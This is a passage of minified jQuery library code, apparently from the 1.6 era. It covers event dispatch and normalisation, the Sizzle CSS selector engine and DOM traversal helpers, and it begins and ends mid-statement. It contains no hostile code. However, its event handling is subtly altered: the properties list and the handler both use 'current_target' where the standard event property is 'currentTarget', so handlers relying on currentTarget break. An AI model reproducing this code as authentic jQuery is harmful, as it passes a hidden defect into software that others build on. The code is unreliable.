n,o=f.event.special[h]||{};if((!o._default||o._default.call(e.ownerDocument,c)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)){try{l&&e[h]&&(n=e[l],n&&(e[l]=null),f.event.triggered=h,e[h]())}catch(p){}n&&(e[l]=n),f.event.triggered=b}}return c.result}},handle:function(c){c=f.event.fix(c||a.event);var d=((f._data(this,"events")||{})[c.type]||[]).slice(0),e=!c.exclusive&&!c.namespace,g=Array.prototype.slice.call(arguments,0);g[0]=c,c.current_target=this;for(var h=0,i=d.length;h<i;h++){var j=d[h];if(e||c.namespace_re.test(j.namespace)){c.handler=j.handler,c.data=j.data,c.handleObj=j;var k=j.handler.apply(this,g);k!==b&&(c.result=k,k===!1&&(c.preventDefault(),c.stopPropagation()));if(c.isImmediatePropagationStopped())break}}return c.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey current_target data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),fix:function(a){if(a[f.expando])return a;var d=a;a=f.Event(d);for(var e=this.props.length,g;e;)g=this.props[--e],a[g]=d[g];a.target||(a.target=a.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),!a.relatedTarget&&a.fromElement&&(a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement);if(a.pageX==null&&a.clientX!=null){var h=a.target.ownerDocument||c,i=h.documentElement,j=h.body;a.pageX=a.clientX+(i&&i.scrollLeft||j&&j.scrollLeft||0)-(i&&i.clientLeft||j&&j.clientLeft||0),a.pageY=a.clientY+(i&&i.scrollTop||j&&j.scrollTop||0)-(i&&i.clientTop||j&&j.clientTop||0)}a.which==null&&(a.charCode!=null||a.keyCode!=null)&&(a.which=a.charCode!=null?a.charCode:a.keyCode),!a.metaKey&&a.ctrlKey&&(a.metaKey=a.ctrlKey),!a.which&&a.button!==b&&(a.which=a.button&1?1:a.button&2?3:a.button&4?2:0);return a},guid:1e8,proxy:f.proxy,special:{ready:{setup:f.bindReady,teardown:f.noop},live:{add:function(a){f.event.add(this,M(a.origType,a.selector),f.extend({},a,{handler:L,guid:a.handler.guid}))},remove:function(a){f.event.remove(this,M(a.origType,a.selector),a)}},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}}},f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!this.preventDefault)return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?D:C):this.type=a,b&&f.extend(this,b),this.timeStamp=f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=D;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=D;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=D,this.stopPropagation()},isDefaultPrevented:C,isPropagationStopped:C,isImmediatePropagationStopped:C};var E=function(a){var b=a.relatedTarget,c=!1,d=a.type;a.type=a.data,b!==this&&(b&&(c=f.contains(this,b)),c||(f.event.handle.apply(this,arguments),a.type=d))},F=function(a){a.type=a.data,f.event.handle.apply(this,arguments)};f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={setup:function(c){f.event.add(this,b,c&&c.selector?F:E,a)},teardown:function(a){f.event.remove(this,b,a&&a.selector?F:E)}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(a,b){if(!f.nodeName(this,"form"))f.event.add(this,"click.specialSubmit",function(a){var b=a.target,c=f.nodeName(b,"input")||f.nodeName(b,"button")?b.type:"";(c==="submit"||c==="image")&&f(b).closest("form").length&&J("submit",this,arguments)}),f.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,c=f.nodeName(b,"input")||f.nodeName(b,"button")?b.type:"";(c==="text"||c==="password")&&f(b).closest("form").length&&a.keyCode===13&&J("submit",this,arguments)});else return!1},teardown:function(a){f.event.remove(this,".specialSubmit")}});if(!f.support.changeBubbles){var G,H=function(a){var b=f.nodeName(a,"input")?a.type:"",c=a.value;b==="radio"||b==="checkbox"?c=a.checked:b==="select-multiple"?c=a.selectedIndex>-1?f.map(a.options,function(a){return a.selected}).join("-"):"":f.nodeName(a,"select")&&(c=a.selectedIndex);return c},I=function(c){var d=c.target,e,g;if(!!x.test(d.nodeName)&&!d.readOnly){e=f._data(d,"_change_data"),g=H(d),(c.type!=="focusout"||d.type!=="radio")&&f._data(d,"_change_data",g);if(e===b||g===e)return;if(e!=null||g)c.type="change",c.liveFired=b,f.event.trigger(c,arguments[1],d)}};f.event.special.change={filters:{focusout:I,beforedeactivate:I,click:function(a){var b=a.target,c=f.nodeName(b,"input")?b.type:"";(c==="radio"||c==="checkbox"||f.nodeName(b,"select"))&&I.call(this,a)},keydown:function(a){var b=a.target,c=f.nodeName(b,"input")?b.type:"";(a.keyCode===13&&!f.nodeName(b,"textarea")||a.keyCode===32&&(c==="checkbox"||c==="radio")||c==="select-multiple")&&I.call(this,a)},beforeactivate:function(a){var b=a.target;f._data(b,"_change_data",H(b))}},setup:function(a,b){if(this.type==="file")return!1;for(var c in G)f.event.add(this,c+".specialChange",G[c]);return x.test(this.nodeName)},teardown:function(a){f.event.remove(this,".specialChange");return x.test(this.nodeName)}},G=f.event.special.change.filters,G.focus=G.beforeactivate}f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){function e(a){var c=f.event.fix(a);c.type=b,c.originalEvent={},f.event.trigger(c,null,c.target),c.isDefaultPrevented()&&a.preventDefault()}var d=0;f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.each(["bind","one"],function(a,c){f.fn[c]=function(a,d,e){var g;if(typeof a=="object"){for(var h in a)this[c](h,d,a[h],e);return this}if(arguments.length===2||d===!1)e=d,d=b;c==="one"?(g=function(a){f(this).unbind(a,g);return e.apply(this,arguments)},g.guid=e.guid||f.guid++):g=e;if(a==="unload"&&c!=="one")this.one(a,d,e);else for(var i=0,j=this.length;i<j;i++)f.event.add(this[i],a,g,d);return this}}),f.fn.extend({unbind:function(a,b){if(typeof a=="object"&&!a.preventDefault)for(var c in a)this.unbind(c,a[c]);else for(var d=0,e=this.length;d<e;d++)f.event.remove(this[d],a,b);return this},delegate:function(a,b,c,d){return this.live(b,c,d,a)},undelegate:function(a,b,c){return arguments.length===0?this.unbind("live"):this.die(b,null,c,a)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f.data(this,"lastToggle"+a.guid)||0)%d;f.data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var K={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};f.each(["live","die"],function(a,c){f.fn[c]=function(a,d,e,g){var h,i=0,j,k,l,m=g||this.selector,n=g?this:f(this.context);if(typeof a=="object"&&!a.preventDefault){for(var o in a)n[c](o,d,a[o],m);return this}if(c==="die"&&!a&&g&&g.charAt(0)==="."){n.unbind(g);return this}if(d===!1||f.isFunction(d))e=d||C,d=b;a=(a||"").split(" ");while((h=a[i++])!=null){j=w.exec(h),k="",j&&(k=j[0],h=h.replace(w,""));if(h==="hover"){a.push("mouseenter"+k,"mouseleave"+k);continue}l=h,K[h]?(a.push(K[h]+k),h=h+k):h=(K[h]||h)+k;if(c==="live")for(var p=0,q=n.length;p<q;p++)f.event.add(n[p],"live."+M(h,m),{data:d,selector:m,handler:e,origType:h,origHandler:e,preType:l});else n.unbind("live."+M(h,m),e)}return this}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.bind(b,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0)}),function(){function u(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}if(i.nodeType===1){f||(i.sizcache=c,i.sizset=g);if(typeof b!="string"){if(i===b){j=!0;break}}else if(k.filter(b,[i]).length>0){j=i;break}}i=i[a]}d[g]=j}}}function t(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}i.nodeType===1&&!f&&(i.sizcache=c,i.sizset=g);if(i.nodeName.toLowerCase()===b){j=i;break}i=i[a]}d[g]=j}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d=0,e=Object.prototype.toString,g=!1,h=!0,i=/\\/g,j=/\W/;[0,0].sort(function(){h=!1;return 0});var k=function(b,d,f,g){f=f||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return f;var i,j,n,o,q,r,s,t,u=!0,w=k.isXML(d),x=[],y=b;do{a.exec(""),i=a.exec(y);if(i){y=i[3],x.push(i[1]);if(i[2]){o=i[3];break}}}while(i);if(x.length>1&&m.exec(b))if(x.length===2&&l.relative[x[0]])j=v(x[0]+x[1],d);else{j=l.relative[x[0]]?[d]:k(x.shift(),d);while(x.length)b=x.shift(),l.relative[b]&&(b+=x.shift()),j=v(b,j)}else{!g&&x.length>1&&d.nodeType===9&&!w&&l.match.ID.test(x[0])&&!l.match.ID.test(x[x.length-1])&&(q=k.find(x.shift(),d,w),d=q.expr?k.filter(q.expr,q.set)[0]:q.set[0]);if(d){q=g?{expr:x.pop(),set:p(g)}:k.find(x.pop(),x.length===1&&(x[0]==="~"||x[0]==="+")&&d.parentNode?d.parentNode:d,w),j=q.expr?k.filter(q.expr,q.set):q.set,x.length>0?n=p(j):u=!1;while(x.length)r=x.pop(),s=r,l.relative[r]?s=x.pop():r="",s==null&&(s=d),l.relative[r](n,s,w)}else n=x=[]}n||(n=j),n||k.error(r||b);if(e.call(n)==="[object Array]")if(!u)f.push.apply(f,n);else if(d&&d.nodeType===1)for(t=0;n[t]!=null;t++)n[t]&&(n[t]===!0||n[t].nodeType===1&&k.contains(d,n[t]))&&f.push(j[t]);else for(t=0;n[t]!=null;t++)n[t]&&n[t].nodeType===1&&f.push(j[t]);else p(n,f);o&&(k(o,h,f,g),k.uniqueSort(f));return f};k.uniqueSort=function(a){if(r){g=h,a.sort(r);if(g)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},k.matches=function(a,b){return k(a,null,null,b)},k.matchesSelector=function(a,b){return k(b,null,null,[a]).length>0},k.find=function(a,b,c){var d;if(!a)return[];for(var e=0,f=l.order.length;e<f;e++){var g,h=l.order[e];if(g=l.leftMatch[h].exec(a)){var j=g[1];g.splice(1,1);if(j.substr(j.length-1)!=="\\"){g[1]=(g[1]||"").replace(i,""),d=l.find[h](g,b,c);if(d!=null){a=a.replace(l.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},k.filter=function(a,c,d,e){var f,g,h=a,i=[],j=c,m=c&&c[0]&&k.isXML(c[0]);while(a&&c.length){for(var n in l.filter)if((f=l.leftMatch[n].exec(a))!=null&&f[2]){var o,p,q=l.filter[n],r=f[1];g=!1,f.splice(1,1);if(r.substr(r.length-1)==="\\")continue;j===i&&(i=[]);if(l.preFilter[n]){f=l.preFilter[n](f,j,d,i,e,m);if(!f)g=o=!0;else if(f===!0)continue}if(f)for(var s=0;(p=j[s])!=null;s++)if(p){o=q(p,f,s,j);var t=e^!!o;d&&o!=null?t?g=!0:j[s]=!1:t&&(i.push(p),g=!0)}if(o!==b){d||(j=i),a=a.replace(l.match[n],"");if(!g)return[];break}}if(a===h)if(g==null)k.error(a);else break;h=a}return j},k.error=function(a){throw"Syntax error, unrecognized expression: "+a};var l=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!j.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&k.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!j.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&k.filter(b,a,!0)}},"":function(a,b,c){var e,f=d++,g=u;typeof b=="string"&&!j.test(b)&&(b=b.toLowerCase(),e=b,g=t),g("parentNode",b,f,a,e,c)},"~":function(a,b,c){var e,f=d++,g=u;typeof b=="string"&&!j.test(b)&&(b=b.toLowerCase(),e=b,g=t),g("previousSibling",b,f,a,e,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(i,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(i,"")},TAG:function(a,b){return a[1].replace(i,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||k.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&k.error(a[0]);a[0]=d++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(i,"");!f&&l.attrMap[g]&&(a[1]=l.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(i,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=k(b[3],null,null,c);else{var g=k.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(l.match.POS.test(b[0])||l.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!k(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=l.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||k.getText([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}k.error(e)},CHILD:function(a,b){var c=b[1],d=a;switch(c){case"only":case"first":while(d=d.previousSibling)if(d.nodeType===1)return!1;if(c==="first")return!0;d=a;case"last":while(d=d.nextSibling)if(d.nodeType===1)return!1;return!0;case"nth":var e=b[2],f=b[3];if(e===1&&f===0)return!0;var g=b[0],h=a.parentNode;if(h&&(h.sizcache!==g||!a.nodeIndex)){var i=0;for(d=h.firstChild;d;d=d.nextSibling)d.nodeType===1&&(d.nodeIndex=++i);h.sizcache=g}var j=a.nodeIndex-f;return e===0?j===0:j%e===0&&j/e>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=l.attrHandle[c]?l.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=l.setFilters[e];if(f)return f(a,c,b,d)}}},m=l.match.POS,n=function(a,b){return"\\"+(b-0+1)};for(var o in l.match)l.match[o]=new RegExp(l.match[o].source+/(?![^\[]*\])(?![^\(]*\))/.source),l.leftMatch[o]=new RegExp(/(^(?:.|\r|\n)*?)/.source+l.match[o].source.replace(/\\(\d+)/g,n));var p=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(q){p=function(a,b){var c=0,d=b||[];if(e.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var f=a.length;c<f;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var r,s;c.documentElement.compareDocumentPosition?r=function(a,b){if(a===b){g=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(r=function(a,b){if(a===b){g=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],h=a.parentNode,i=b.parentNode,j=h;if(h===i)return s(a,b);if(!h)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return s(e[k],f[k]);return k===c?s(a,f[k],-1):s(e[k],b,1)},s=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),k.getText=function(a){var b="",c;for(var d=0;a[d];d++)c=a[d],c.nodeType===3||c.nodeType===4?b+=c.nodeValue:c.nodeType!==8&&(b+=k.getText(c.childNodes));return b},function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(l.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},l.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(l.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(l.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=k,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){k=function(b,e,f,g){e=e||c;if(!g&&!k.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return p(e.getElementsByTagName(b),f);if(h[2]&&l.find.CLASS&&e.getElementsByClassName)return p(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return p([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return p([],f);if(i.id===h[3])return p([i],f)}try{return p(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var m=e,n=e.getAttribute("id"),o=n||d,q=e.parentNode,r=/^\s*[+~]/.test(b);n?o=o.replace(/'/g,"\\$&"):e.setAttribute("id",o),r&&q&&(e=e.parentNode);try{if(!r||q)return p(e.querySelectorAll("[id='"+o+"'] "+b),f)}catch(s){}finally{n||m.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)k[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}k.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!k.isXML(a))try{if(e||!l.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return k(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;l.order.splice(1,0,"CLASS"),l.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?k.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?k.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:k.contains=function(){return!1},k.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var v=function(a,b){var c,d=[],e="",f=b.nodeType?[b]:b;while(c=l.match.PSEUDO.exec(a))e+=c[0],a=a.replace(l.match.PSEUDO,"");a=l.relative[a]?a+"*":a;for(var g=0,h=f.length;g<h;g++)k(a,f[g],d);return k.filter(e,d)};f.find=k,f.expr=k.selectors,f.expr[":"]=f.expr.filters,f.unique=k.uniqueSort,f.text=k.getText,f.isXMLDoc=k.isXML,f.contains=k.contains}();var N=/Until$/,O=/^(?:parents|prevUntil|prevAll)/,P=/,/,Q=/^.[^:#\[\.,]*$/,R=Array.prototype.slice,S=f.expr.match.POS,T={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(V(this,a,!1),"not",a)},filter:function(a){return this.pushStack(V(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h,i,j={},k=1;if(g&&a.length){for(d=0,e=a.length;d<e;d++)i=a[d],j[i]||(j[i]=S.test(i)?f(i,b||this.context):i);while(g&&g.ownerDocument&&g!==b){for(i in j)h=j[i],(h.jquery?h.index(g)>-1:f(g).is(h))&&c.push({selector:i,elem:g,level:k});g=g.parentNode,k++}}return c}var l=S.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(l?l.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a)return this[0]&&this[0].parentNode?this.prevAll().length:-1;if(typeof a=="string")return f.inArray(this[0],f(a));return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(U(c[0])||U(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c),g=R.call(arguments);N.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!T[a]?f.unique(e):e,(this.length>1||P.test(d))&&O.test(a)&&(e=e.reverse());return this.pushStack(e,a,g.join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var W=/ 